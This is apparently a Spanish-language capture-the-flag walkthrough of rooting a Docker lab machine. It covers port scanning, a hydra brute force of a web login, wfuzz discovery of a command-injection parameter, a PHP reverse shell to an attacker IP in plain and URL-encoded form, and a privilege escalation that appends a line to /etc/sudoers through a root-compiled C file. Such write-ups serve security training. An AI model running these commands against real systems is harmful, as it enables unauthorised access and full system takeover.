# Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 15:09 -03
Nmap scan report for 172.17.0.2
Host is up (0.000028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 cc:70:cb:29:31:d9:48:f7:e2:2f:ec:b2:65:8c:ee:8e (ED25519)
80/tcp open  tcpwrapped
|_http-title: \xF0\x9F\x91\x8B Mario \xC3\x81lvarez Fer\xC5\x84andez
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds
```

2 servicios expuestos, asi que chequeo primero el servicio web

![image](https://github.com/user-attachments/assets/ce46db1f-aaec-4e0a-b92f-f3e801f5642a)

y resulta ser el sitio web del 🐧 de Mario, revisando el sitio web me consigo con un panel de login al intentar ir al LinkedIn del 🐧

![image](https://github.com/user-attachments/assets/003bc0da-3884-45e4-8508-5b2f8fc60200)

![image](https://github.com/user-attachments/assets/b8644cf0-6002-495a-8cc8-87594aee96f4)

# Ataque de Diccionario Login

Aplicando un ataque de Diccionario al panel de login logro conseguir credenciales

```ruby
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form '/sobre-mi/login.php:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos.' -f -t 64 -I
```
```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-23 15:15:10
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344403 login tries (l:1/p:14344403), ~224132 tries per task
[DATA] attacking http-post-form://172.17.0.2:80/sobre-mi/login.php:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos.
[80][http-post-form] host: 172.17.0.2   login: administrator   password: panther
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-23 15:15:18
```

asi que accedo al panel

![image](https://github.com/user-attachments/assets/04e49fff-d273-4dd7-98a9-86dd18bb3219)

han dejado credenciales por `SSH` y un mensaje interesante, asi que por ahora intentare acceder via `SSH`

![image](https://github.com/user-attachments/assets/306f1534-cfaa-43f2-a50e-f379991ad000)

despues de varios intentos, no me es posible el acceso e imagino debe ser por la razon que explican en el mensaje junto a las credenciales `SSH` de que `un segmento de red se encuentra
restringido por seguridad` asi que ire cambiando de `ip` mientras voy intentando acceder via `SSH` hasta dar con el segmento de red que no se encuentre restringido

![image](https://github.com/user-attachments/assets/461d2781-99e3-4a55-8117-7778d136302d)

por un lado, consigo dar con el segmento de red que no esta restringido, pero por otro lado despues de acceder, el user `darks` se encuentra restringido con una `rbash` y el administrador
de sistema le daja un mensaje

![image](https://github.com/user-attachments/assets/daa9c4e4-3b02-4e3a-a86d-4a56d78c42d5)

por el mensaje que dejan me queda claro que debe existir un fallo de seguiridad y luego de ir chequeando el servicio web me consigo con una `RCE` (para conseguir la RCE debe lanzarse `wfuzz` una vez logueado en el panel)


```ruby
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.17.0.2/sobre-mi/confidencial.php?FUZZ=FUZZ" -t 200 --hl=44
```
```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/sobre-mi/confidencial.php?FUZZ=FUZZ
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================

000004986:   302        46 L     94 W       1202 Ch     "cmd - cmd"

```

![image](https://github.com/user-attachments/assets/b705ee5d-d101-4423-ab9f-ea2c649989a9)

asi que enviare una revershell

revershell enviada:
```bash
php -r '$sock=fsockopen("172.17.0.200",4450);exec("/bin/bash <&3 >&3 2>&3");'
```

luego la url-encodeo para enviar

```bash
%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%37%32%2e%31%37%2e%30%2e%32%30%30%22%2c%34%34%35%30%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%62%61%73%68%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27
```

![image](https://github.com/user-attachments/assets/ecccc06c-9942-435b-9b4d-7aa20146ac3f)

obtengo acceso al `Sistema`

# Escalada de Privilegios

### `www-data`

tratamiento de la `tty`

```bash
export TERM=xterm
export SHELL=bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 cols 168
```
existen 2 user en el sistema: `darks` & `cristal`, `darks` tiene una `rbash` asi que intentare escalar a `cristal`

![image](https://github.com/user-attachments/assets/42f26733-23c0-4118-91f8-15de79d9304b)

me consigo con lo que parece ser un binario, pero si lo ejecuto aparentemente no ocurre nada, por lo que para examinarlo lo pasare a mi maquina atacante

### Examinando el Binario `sendinv2`


![image](https://github.com/user-attachments/assets/2d0751e5-f52d-437b-afbb-644621cb2aa2)

me llamo primero la atencion la cadena que parece codificada en `baseX` pero despues de hacer pruebas no es legible, asi que me quedo con la siguiente informacion:

```bash
Error al crear el socket
172.17.0.188
Error al enviar datos
```

parece que el binario al ser ejecutado envia datos y al parecer lo hace a la ip `172.17.0.188`, por lo que ejecutare el binario (nunca ejecuten binarios en su maquina local sino es con firejail)
en la maquina vulnerada, cambiare de ip a la `172.17.0.188` y dumpeare la red a ver que informacion logro obtener

![image](https://github.com/user-attachments/assets/202846b0-8d98-491e-af7a-966adfc05a73)

aqui puedo ver a traves de `tcpdum` :

```bash
16:09:05.958213 IP 172.17.0.2.48398 > kali.7777: UDP, length 336

ip de origen: 172.17.0.2
puerto de origen: 48398
ip de destino: kali (172.17.0.188)
puerto de destino: 7777
protocolo: UDP
```
asi que el binario envia informacion a la ip y puerto `172.17.0.188:7777` a traves del protocolo `UDP` por lo que si me coloco en escucha deberia recibir informacion

![Screenshot From 2024-11-23 16-20-11](https://github.com/user-attachments/assets/c1538cda-3200-460d-aca3-5a2edb57e740)

y en efecto se recibe una cadena que esta codeada 

cadena recibida
```bash
MFDTS42ZKNCWOYZSHF2GEM2NM5NFO53HLIZUUMLDI44GOULNPBUFSMTUIRMVQULTJFEEE3DCNZHGQYSXHF5ESR2WOVEUOVTVLEZUU4DDJBJGQY3JIJWGGM2SNQFESSCONRRW4WTMMNUUE522LBFHMSKHGV3ESSCSOBNFONLMJFDTK2C2I5CWOWSHKVTWCVZVGBNFQSTMMN4XOZ3EI5KWOWKXNB3GG3SKNBRW2VLHMRDWY3DCLBBHMCSPNFBGUY3NNR5GIR2GONHW2UTZMIZUE2TBI44XUZCHHF3U4RCVPJKTA4CHJFCG6Z22I5WHUWTOJIYWIR2FJMFA====
```

![image](https://github.com/user-attachments/assets/267c51a6-0adc-4937-944d-f28c87b88d08)

despues de decodificar la cadena se obtiene el siguiente mensaje con credenciales:

```bash
hola! somos el grupo BlackCat, pensamos en encriptar este server pero no tiene nada de interes, te ahorrare tiempo: cristal:dropchostop453SJF : disfruta
```

asi que pivoto al user `cristal` pero para esto tengo que volver a la ip con la que tome la `revershell` para asi poder volver a tomar el control de ella

```ruby
ip addres del 172.17.0.188/16 dev docker0 # elimino mi actual direccion ip
```
```ruby
ip addres add 172.17.0.200/16 dev docker0 # asigno ip con la que tome la revershell
```
he vuelto a tener control de la revershell y ahora si pivoto al user `cristal`

### cristal

este user no puede ejecutar comandos como `root` pero en su directorio se encuentra lo siguiente:

```bash
cristal@9dd61d803e3b:~$ ls -la
total 56
drwxr-x--- 1 cristal cristal  4096 Nov 23 14:28 .
drwxr-xr-x 1 root    root     4096 Nov 11 12:07 ..
-rw------- 1 cristal cristal     0 Nov 11 12:20 .bash_history
-rw-r--r-- 1 cristal cristal   220 Nov 11 12:07 .bash_logout
-rw-r--r-- 1 cristal cristal  3771 Nov 11 12:07 .bashrc
drwxrwxr-x 3 cristal cristal  4096 Nov 11 12:13 .local
-rw-r--r-- 1 cristal cristal   807 Nov 11 12:07 .profile
-rwxr-xr-x 1 root    root    16416 Nov 23 14:28 syst
-rw-rw-r-- 1 root    editor   1516 Nov 11 12:13 systm.c
-rwxr-xr-x 1 root    root      141 Nov 11 20:33 systm.sh
```
si reviso el script systm.sh 

```bash
#!/bin/bash

var1="/home/cristal/systm.c"
var2="/home/cristal/syst"

while true; do
      gcc -o $var2 $var1
      $var2
      sleep 15
done
```
dentro de un bucle while infinito compila un binario y lo ejecuta cada 15 segundos, el codigo que compila es `systm.c` y tras chequear el codigo `C` parece que registra informacion en un
archivo en la ruta `"/tmp/registros.log"` 

![image](https://github.com/user-attachments/assets/5fa753d6-38f4-4f43-89b7-50f197df1f12)

reviso y en efecto existe el archivo, ahora reviso los procesos a ver si se esta ejecutando el script `.sh` en segundo plano

![image](https://github.com/user-attachments/assets/361c59d6-5f10-4413-b3cb-f1e7a55ce3da)

`root` esta ejecutando el script y como el user `cristal` pertenece al grupo `editor` y dicho grupo tiene permisos de escritura sobre el codigo C que es compilado, puedo modificarlo
y lograr inyeccion de comandos como `root`, por lo que modifico el codigo eliminando todo su contenido y agregando el siguiente codigo para hacer que el user `cristal` pueda ejecutar
cualquier comando como `root`

```ruby
#include <stdlib.h>

int main() {
    // Comando a ejecutar
    const char *command = "echo 'cristal    ALL=(ALL:ALL) ALL' >> /etc/sudoers";

    // Ejecutar el comando usando system()
    (void)system(command); // Ignorar el resultado

    return 0;
}
```
luego de esperar un rato (unos 15 segundos) ya puedo escalar a `root`

![image](https://github.com/user-attachments/assets/f86f0747-1b34-4f39-9609-98c6277cac0d)

### `ROOT`

una vez ya soy `root` detengo el script para que no continue agregando lineas al archivo `/etc/sudoers`









